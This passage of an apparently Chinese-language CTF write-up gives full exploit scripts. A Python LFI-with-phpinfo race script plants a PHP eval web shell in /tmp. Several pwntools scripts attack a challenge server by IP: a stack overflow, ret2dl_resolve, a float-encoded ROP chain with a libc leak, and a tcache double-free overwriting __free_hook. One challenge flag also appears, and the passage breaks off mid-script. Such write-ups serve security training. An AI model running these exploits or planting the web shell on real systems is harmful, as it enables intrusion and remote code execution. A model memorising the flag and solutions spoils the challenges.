<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python </span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">def setup(host, port):</span><br><span class="line">    TAG=&quot;Security Test&quot;</span><br><span class="line">    PAYLOAD=&quot;&quot;&quot;%s\r</span><br><span class="line">&lt;?php file_put_contents(&apos;/tmp/g&apos;, &apos;&lt;?=eval($_REQUEST[1])?&gt;&apos;)?&gt;\r&quot;&quot;&quot; % TAG</span><br><span class="line">    REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714\r</span><br><span class="line">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r</span><br><span class="line">Content-Type: text/plain\r</span><br><span class="line">\r</span><br><span class="line">%s</span><br><span class="line">-----------------------------7dbff1ded0714--\r&quot;&quot;&quot; % PAYLOAD</span><br><span class="line">    padding=&quot;A&quot; * 5000</span><br><span class="line">    REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1\r</span><br><span class="line">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;\r</span><br><span class="line">HTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\r</span><br><span class="line">HTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r</span><br><span class="line">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r</span><br><span class="line">HTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span><br><span class="line">Content-Length: %s\r</span><br><span class="line">Host: %s\r</span><br><span class="line">\r</span><br><span class="line">%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    #modify this to suit the LFI script   </span><br><span class="line">    LFIREQ=&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\r</span><br><span class="line">User-Agent: Mozilla/4.0\r</span><br><span class="line">Proxy-Connection: Keep-Alive\r</span><br><span class="line">Host: %s\r</span><br><span class="line">\r</span><br><span class="line">\r</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    return (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line">def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = &quot;&quot;</span><br><span class="line">    while len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    try:</span><br><span class="line">        i = d.index(&quot;[tmp_name] =&amp;gt; &quot;)</span><br><span class="line">        fn = d[i+17:i+31]</span><br><span class="line">    except ValueError:</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(4096)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    if d.find(tag) != -1:</span><br><span class="line">        return fn</span><br><span class="line"></span><br><span class="line">counter=0</span><br><span class="line">class ThreadWorker(threading.Thread):</span><br><span class="line">    def __init__(self, e, l, m, *args):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        global counter</span><br><span class="line">        while not self.event.is_set():</span><br><span class="line">            with self.lock:</span><br><span class="line">                if counter &gt;= self.maxattempts:</span><br><span class="line">                    return</span><br><span class="line">                counter+=1</span><br><span class="line"></span><br><span class="line">            try:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                if self.event.is_set():</span><br><span class="line">                    break                </span><br><span class="line">                if x:</span><br><span class="line">                    print &quot;\nGot it! Shell created in /tmp/g&quot;</span><br><span class="line">                    self.event.set()</span><br><span class="line">                    </span><br><span class="line">            except socket.error:</span><br><span class="line">                return</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def getOffset(host, port, phpinforeq):</span><br><span class="line">    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    </span><br><span class="line">    d = &quot;&quot;</span><br><span class="line">    while True:</span><br><span class="line">        i = s.recv(4096)</span><br><span class="line">        d+=i        </span><br><span class="line">        if i == &quot;&quot;:</span><br><span class="line">            break</span><br><span class="line">        # detect the final chunk</span><br><span class="line">        if i.endswith(&quot;0\r\n\r\n&quot;):</span><br><span class="line">            break</span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)</span><br><span class="line">    if i == -1:</span><br><span class="line">        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)</span><br><span class="line">    </span><br><span class="line">    print &quot;found %s at %i&quot; % (d[i:i+10],i)</span><br><span class="line">    # padded up a bit</span><br><span class="line">    return i+256</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    </span><br><span class="line">    print &quot;LFI With PHPInfo()&quot;</span><br><span class="line">    print &quot;-=&quot; * 30</span><br><span class="line"></span><br><span class="line">    if len(sys.argv) &lt; 2:</span><br><span class="line">        print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[1])</span><br><span class="line">    except socket.error, e:</span><br><span class="line">        print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    port=80</span><br><span class="line">    try:</span><br><span class="line">        port = int(sys.argv[2])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)</span><br><span class="line">        sys.exit(1)</span><br><span class="line">    </span><br><span class="line">    poolsz=10</span><br><span class="line">    try:</span><br><span class="line">        poolsz = int(sys.argv[3])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    print &quot;Getting initial offset...&quot;,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = 1000</span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    print &quot;Spawning worker pool (%d)...&quot; % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    for i in range(0,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    for t in tp:</span><br><span class="line">        t.start()</span><br><span class="line">    try:</span><br><span class="line">        while not e.wait(1):</span><br><span class="line">            if e.is_set():</span><br><span class="line">                break</span><br><span class="line">            with l:</span><br><span class="line">                sys.stdout.write( &quot;\r% 4d / % 4d&quot; % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                if counter &gt;= maxattempts:</span><br><span class="line">                    break</span><br><span class="line">        print</span><br><span class="line">        if e.is_set():</span><br><span class="line">            print &quot;Woot!  \m/&quot;</span><br><span class="line">        else:</span><br><span class="line">            print &quot;:(&quot;</span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        print &quot;\nTelling threads to shutdown...&quot;</span><br><span class="line">        e.set()</span><br><span class="line">    </span><br><span class="line">    print &quot;Shuttin&apos; down...&quot;</span><br><span class="line">    for t in tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="16.png" alt="16"></p>
<p>运行脚本</p>
<p><img src="15.png" alt="15"></p>
<p>（表示后来没有上传成功，但似乎有大佬先上传成功了，所以后面的步骤我也能继续做）</p>
<p>先验证是否上传成功</p>
<p><img src="70.png" alt="70"></p>
<p>嗯，的确有大佬上传成功了，连文件名也一样，好的，谢谢了。getsheell</p>
<p>于是<img src="36.png" alt="36"></p>
<p>flag应该在那个奇怪名字的文件里吧</p>
<p><img src="28.png" alt="28"></p>
<p>果然，</p>
<p><img src="89.png" alt="89"></p>
<p>拿到flag</p>
<p>这题的关键还是上传有大量垃圾数据的恶意文件吧。（所以哪位大佬上传成功了）</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="hardpwn"><a href="#hardpwn" class="headerlink" title="hardpwn"></a>hardpwn</h3><p>导入IDA后，发现需要覆盖运行参数（即argv），因为栈溢出很长且可以覆盖到该参数，所以可以考虑直接覆盖</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">elf = ELF(&quot;pwn1&quot;)</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process(&quot;./pwn1&quot;)</span><br><span class="line">	else:	</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	payload = &apos;\x00&apos; * 120 +&quot;aaaa&quot; + &quot;\x00&quot;</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;47.110.227.208&quot;,10001,0)</span><br></pre></td></tr></table></figure>

<p><img src="59.png" alt="59"></p>
<h3 id="stackpwn"><a href="#stackpwn" class="headerlink" title="stackpwn"></a>stackpwn</h3><p>导入IDA后，发现没有puts、write等，只有read且有溢出，那么这道题就是典型的考察ret2_dl_resolve，用ctf-wiki的脚本改一下就可以拿到shell了</p>
<p>利用roputils简化攻击</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from roputils import *</span><br><span class="line">from pwn import process</span><br><span class="line">from pwn import gdb</span><br><span class="line">from pwn import context</span><br><span class="line">from pwn import remote</span><br><span class="line">#r = process(&apos;./pwn3&apos;)</span><br><span class="line">r = remote(&quot;47.110.227.208&quot;,10003)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">rop = ROP(&apos;./pwn3&apos;)</span><br><span class="line">offset = 60</span><br><span class="line">bss_base = 0x804a000 + 0x800</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line">buf += rop.call(&apos;read&apos;, 0, bss_base, 100)</span><br><span class="line">buf += rop.dl_resolve_call(bss_base + 20, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line">buf = rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">buf += rop.fill(20, buf)</span><br><span class="line">buf += rop.dl_resolve_data(bss_base + 20, &apos;system&apos;)</span><br><span class="line">buf += rop.fill(100, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="35.png" alt="35"></p>
<h3 id="floatpwn"><a href="#floatpwn" class="headerlink" title="floatpwn"></a>floatpwn</h3><p>这题考察了确定浮点寄存器通过movss写入内存时的数值</p>
<p>方法：只能人工二分法一次一次去尝试，然后发现小数点后45位之前可以忽略不计，真正开始有意义的数值在小数点后45位开始。然后求出对应的n使得写回内存时是我想要的数值，从而构造ROP链。但是想构造ROP链之前需要实现无限写，所以输入size时，可以考虑输入负数，实现无符号整数溢出，从而无限写。因为控制写入数据位置的i变量位于栈空间底部，所以要使得写到i里的数据为10到12即可，因为可以考虑直接略过ebp，直接修改rip。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">elf = ELF(&quot;pwn2&quot;)</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def inputFloat(num):</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.send(num)</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline()</span><br><span class="line">def inputRop(num):</span><br><span class="line">	num = str(num)</span><br><span class="line">	num = num.rjust(45,&quot;0&quot;)</span><br><span class="line">	num = num.ljust(0x62,&quot;0&quot;)</span><br><span class="line">	inputFloat(&quot;0.&quot; + num)</span><br><span class="line">	inputFloat(&quot;0&quot;)	</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process(&quot;./pwn2&quot;)</span><br><span class="line">		lib = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF(&quot;libc6_2.27-3ubuntu1_amd64.so&quot;)</span><br><span class="line">	#puts 5879714 0x400640</span><br><span class="line">	#pop_rdi 5881041 0x4009f3</span><br><span class="line">	#__libc_start_main_got 8822026 0x601038</span><br><span class="line">	#main 5880847 0x400969</span><br><span class="line">	#start 5879938 0x4006E0</span><br><span class="line">	#call vul 5880867 0x400977</span><br><span class="line">	#vul 5880653 0x4008DE</span><br><span class="line">	#read 5879781 0x400670</span><br><span class="line">	#pop_rsi_r15_ret 5881038 0x4009f1</span><br><span class="line">	#read_got 8822014 0x601030</span><br><span class="line">	#binsh 8822106 0x601071</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline(&quot;-1.9999&quot;)</span><br><span class="line">	for i in range(0,13):</span><br><span class="line">		inputFloat(&quot;111&quot;)</span><br><span class="line">	inputFloat(&quot;13&quot;)</span><br><span class="line">	inputFloat(&quot;13&quot;)</span><br><span class="line">	inputFloat(&quot;0.&quot; + &quot;0&quot; * 43 + &quot;23&quot;)#0x11</span><br><span class="line">	inputFloat(&quot;0.&quot; + &quot;0&quot; * 43 + &quot;23&quot;)#fake</span><br><span class="line"></span><br><span class="line">	#rip = 0x4009f3</span><br><span class="line">	#pop_rdi_ret</span><br><span class="line">	inputRop(5881041)</span><br><span class="line"></span><br><span class="line">	#__libc_start_main got</span><br><span class="line">	inputRop(8822026)</span><br><span class="line"></span><br><span class="line">	#puts_plt</span><br><span class="line">	inputRop(5879714)</span><br><span class="line">	</span><br><span class="line">	#pop_rdi_ret</span><br><span class="line">	inputRop(5881041)</span><br><span class="line">	inputRop(0)</span><br><span class="line"></span><br><span class="line">	#pop_rsi_r15_ret</span><br><span class="line">	inputRop(5881038)</span><br><span class="line">	inputRop(8822106)</span><br><span class="line">	inputRop(0)</span><br><span class="line"></span><br><span class="line">	#read_plt</span><br><span class="line">	inputRop(5879781)</span><br><span class="line"></span><br><span class="line">	#pop_rdi_ret</span><br><span class="line">	inputRop(5881041)</span><br><span class="line">	inputRop(0)</span><br><span class="line"></span><br><span class="line">	#pop_rsi_r15_ret</span><br><span class="line">	inputRop(5881038)</span><br><span class="line">	inputRop(8822014)</span><br><span class="line">	inputRop(0)</span><br><span class="line"></span><br><span class="line">	#read_plt</span><br><span class="line">	inputRop(5879781)</span><br><span class="line"></span><br><span class="line">	#pop_rdi_ret</span><br><span class="line">	inputRop(5881041)</span><br><span class="line">	inputRop(8822106)</span><br><span class="line"></span><br><span class="line">	#read_plt</span><br><span class="line">	inputRop(5879781)</span><br><span class="line"></span><br><span class="line">	#input()</span><br><span class="line">	sh.recvuntil(&quot;plz input your float:&quot;)</span><br><span class="line">	sh.sendline(&quot;0&quot;)</span><br><span class="line">	sh.recvuntil(&quot;do you want to continue?(y/n)&quot;)</span><br><span class="line">	sh.send(&quot;n&quot;)</span><br><span class="line"></span><br><span class="line">	__libc_start_main = u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))</span><br><span class="line">	libc = __libc_start_main - lib.symbols[&apos;__libc_start_main&apos;]</span><br><span class="line">	system = libc + lib.symbols[&apos;system&apos;]</span><br><span class="line">	binsh = libc + lib.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">	sh.sendline(&quot;/bin/sh\x00&quot;)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline(p64(system))</span><br><span class="line">	log.success(&quot;__libc_start_main: &quot; + hex(__libc_start_main))</span><br><span class="line">	log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">	log.success(&quot;binsh: &quot; + hex(binsh))</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;47.110.227.208&quot;,10002,0)</span><br></pre></td></tr></table></figure>

<p><img src="71.png" alt="71"></p>
<h3 id="Babytcache"><a href="#Babytcache" class="headerlink" title="Babytcache"></a>Babytcache</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec 可以看到程序没有开PIE,同时bss中存放了_IO_2_1_stdout_的地址,并且libc2.27有double free,所以思路就很明确了.有了double free就可以malloc 2 everywhere,所以这样一的难点在于如何leak libc,通过double free,可以让fd指向_IO_2_1_stdout_,从而malloc 2 _IO_2_1_stdout_,从而修改write_base来leak libc,之后再double free去修改free_hook为system,去free一个/bin/sh就可以了</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">libc=ELF(&apos;./libc.so&apos;)</span><br><span class="line">sh=remote(&quot;47.110.227.208&quot;,10006)</span><br><span class="line"></span><br><span class="line"># CyCTF&#123;Tc4ch3_Att4ck_Is_S1mpl3_R1ght?&#125;</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;input your size:&apos;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&apos;input your message:&apos;)</span><br><span class="line">    sh.send(content)</span><br><span class="line">    sh.recvuntil(&apos;Done!\n&apos;)</span><br><span class="line"></span><br><span class="line">def add2(size,content):</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;input your size:&apos;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&apos;input your message:&apos;)</span><br><span class="line">    sh.send(content)</span><br><span class="line">    #sh.recvuntil(&apos;Done!\n&apos;)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">    sh.recvuntil(&apos;input the index: &apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    add(0x100,&apos;a\n&apos;)</span><br><span class="line">    add(0x100,&apos;a\n&apos;)</span><br><span class="line">    add(0x100,&apos;a\n&apos;)</span><br><span class="line">    delete(0)</span><br><span class="line">    delete(0)</span><br><span class="line">    add(0x100,p64(0x0000000000602020)+&apos;\n&apos;)</span><br><span class="line">    add(0x100,p64(0x0000000000602020)+&apos;\n&apos;)</span><br><span class="line">    add(0x100,&apos;\n&apos;)</span><br><span class="line">    </span><br><span class="line">    add2(0x100,p64(0xfbad1880)+p64(0x0)*3+&apos;\x20\n&apos;)</span><br><span class="line">    libc_base=u64(sh.recv(6)+&apos;\x00\x00&apos;)-0x3eb780</span><br><span class="line">    print &quot;libc_base -&gt; &quot; + hex(libc_base)</span><br><span class="line">    free_hook=libc_base+libc.symbols[&apos;__free_hook&apos;]</span><br><span class="line">    system=libc_base+libc.symbols[&apos;system&apos;]</span><br><span class="line">    sh.recvuntil(&apos;Done!\n&apos;)</span><br><span class="line">    </span><br><span class="line">    add(0x10,&apos;/bin/sh\x00\n&apos;) # index 7</span><br><span class="line">    add(0x20,&apos;\n&apos;) # index 8</span><br><span class="line">    delete(8)</span><br><span class="line">    delete(8)</span><br><span class="line">    add(0x20,p64(free_hook)+&apos;\n&apos;)</span><br><span class="line">    